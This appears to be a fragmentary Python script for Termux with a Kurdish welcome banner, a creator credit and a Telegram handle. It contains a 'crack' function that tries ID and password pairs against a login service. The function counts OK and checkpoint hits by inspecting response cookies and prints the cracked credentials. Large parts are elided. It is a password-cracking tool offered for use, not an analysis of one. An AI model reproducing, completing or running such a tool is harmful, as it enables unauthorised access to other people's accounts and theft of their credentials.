...
print('\n\033[1;32m ••• > ناوت چیە بەریز<•••')
name2 = input('\033[1;37mNAWUT BNUSA : \033[1;32m')
os.system('espeak -a 300 " Welcome,   "'+name2)
logo =f"""                                                                        
\033[1;37m

 W E L C O M  H A M A  T E R M U  X   S
                          
                                 
CRATE BY >> tlyak
\033[1;37m------------------------------------------------
\033[1;37m░ TELEGRAM   : \033[1;32m @luffy404m
\033[1;37m░ Status     :  \033[1;32m PRO HAMA                        
\033[1;37m------------------------------------------------
 """
 #------------------[ DYAR ]-------------------#
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r{Z}[HAMA-WITH]{P} {Z}[{Z}{loop}{Z}/{Z}{len(id)}{Z}]—{Z}[{H}{ok}{Z}]—[{K}{cp}{Z}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{Z}]     ")
    sys.stdout.flush()
    ...
    'user-agent': ua,
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r[{b}CP-HAMA-✖{x}]{b} {b}{idf} | {pw}')
                ...
                print(f'\r{x}-HAMA-OK- {H}{idf} | {pw}{ua}{M}\n')
